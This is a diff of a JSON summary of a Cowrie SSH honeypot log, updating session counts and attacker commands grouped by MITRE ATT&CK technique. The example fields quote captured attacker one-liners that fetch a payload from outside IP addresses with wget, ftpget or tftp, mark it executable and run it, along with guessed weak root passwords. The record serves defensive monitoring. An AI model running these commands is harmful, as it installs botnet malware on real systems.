@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-14 03:01:42",
+  "generated": "2026-08-14 04:03:11",
   "totals": {
-    "commands": 84,
-    "login_failed": 114,
-    "login_success": 12,
-    "sessions": 187
+    "commands": 116,
+    "login_failed": 374,
+    "login_success": 15,
+    "sessions": 472
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 114,
+      "count": 374,
       "examples": [
         "dispatch-sjjr / dispatch-sjjr",
         "root / 123321",
@@ -21,14 +21,14 @@
         "root / 12345"
       ],
       "first": "2026-08-14T00:01:53.440937Z",
-      "last": "2026-08-14T02:51:41.542807Z",
-      "unique_ips": 19
+      "last": "2026-08-14T04:03:07.889210Z",
+      "unique_ips": 22
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 30,
+      "count": 45,
       "examples": [
         "(ftpget 185.93.89.72 f ftpget || busybox ftpget 185.93.89.72 f ftpget) > f; chmod 777 f; ./f; rm -rf f",
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
@@ -37,14 +37,14 @@
         ">/var/run/d && chmod 777 /var/run/d && /var/run/d && cd /var/run/"
       ],
       "first": "2026-08-14T00:00:30.036482Z",
-      "last": "2026-08-14T02:48:09.312008Z",
-      "unique_ips": 4
+      "last": "2026-08-14T03:33:58.364971Z",
+      "unique_ips": 5
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 12,
+      "count": 15,
       "examples": [
         "ubuntu / 123456",
         "enable\\x00 / linuxshell\\x00",
@@ -53,14 +53,14 @@
         "root / root"
       ],
       "first": "2026-08-14T00:11:55.270801Z",
-      "last": "2026-08-14T02:51:44.687941Z",
-      "unique_ips": 10
+      "last": "2026-08-14T03:49:20.764838Z",
+      "unique_ips": 13
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 9,
+      "count": 13,
       "examples": [
         "(ftpget 185.93.89.72 f ftpget || busybox ftpget 185.93.89.72 f ftpget) > f; chmod 777 f; ./f; rm -rf f",
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
@@ -69,32 +69,33 @@
         "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t"
       ],
       "first": "2026-08-14T00:00:30.036482Z",
-      "last": "2026-08-14T02:48:10.171229Z",
-      "unique_ips": 3
+      "last": "2026-08-14T03:33:58.364971Z",
+      "unique_ips": 4
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 2,
+      "count": 3,
       "examples": [
-        "uname -a"
+        "uname -a",
+        "uname -s -v -n -r -m"
       ],
       "first": "2026-08-14T00:12:07.783870Z",
-      "last": "2026-08-14T00:44:57.896754Z",
-      "unique_ips": 2
+      "last": "2026-08-14T03:49:21.574020Z",
+      "unique_ips": 3
     },
     {
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 1,
+      "count": 2,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w"
       ],
       "first": "2026-08-14T00:59:24.418630Z",
-      "last": "2026-08-14T00:59:24.418630Z",
-      "unique_ips": 1
+      "last": "2026-08-14T03:33:21.828522Z",
+      "unique_ips": 2
     }
   ],
   "unmapped": [
@@ -103,43 +104,47 @@
       11
     ],
     [
+      "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
+      8
+    ],
+    [
       "system",
-      6
+      7
     ],
     [
       "shell",
-      6
+      7
     ],
     [
       "sh",
-      6
+      7
     ],
     [
       "enable",
-      4
+      5
+    ],
+    [
+      "linuxshell",
+      3
+    ],
+    [
+      "enablelinuxshell",
+      3
+    ],
+    [
+      "ping ;sh",
+      3
+    ],
+    [
+      "cd /proc && cat self/cmdline",
+      3
     ],
     [
       "/bin/busybox UNSTABLE",
       2
     ],
     [
-      "linuxshell",
-      2
-    ],
-    [
-      "enablelinuxshell",
-      2
-    ],
-    [
-      "ping ;sh",
-      2
-    ],
-    [
       "busybox",
-      2
-    ],
-    [
-      "cd /proc && cat self/cmdline",
       2
     ],
     [
